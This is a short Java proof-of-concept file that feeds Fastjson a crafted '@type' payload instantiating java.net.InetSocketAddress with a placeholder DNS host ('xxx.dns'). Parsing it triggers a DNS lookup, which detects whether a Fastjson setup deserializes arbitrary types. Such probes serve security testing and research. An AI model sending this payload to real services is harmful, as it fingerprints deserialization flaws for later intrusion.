package com.security.bug.fastjson.dns;

import com.alibaba.fastjson.JSON;

/**

 */
public class InetSocketAddressPoc {

    public static void main(String[] args) {
        String payload = "{\"@type\":\"java.net.InetSocketAddress\"{\"address\":,\"val\":\"xxx.dns\"}, \"port\":80}";
        try {
            JSON.parse(payload);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
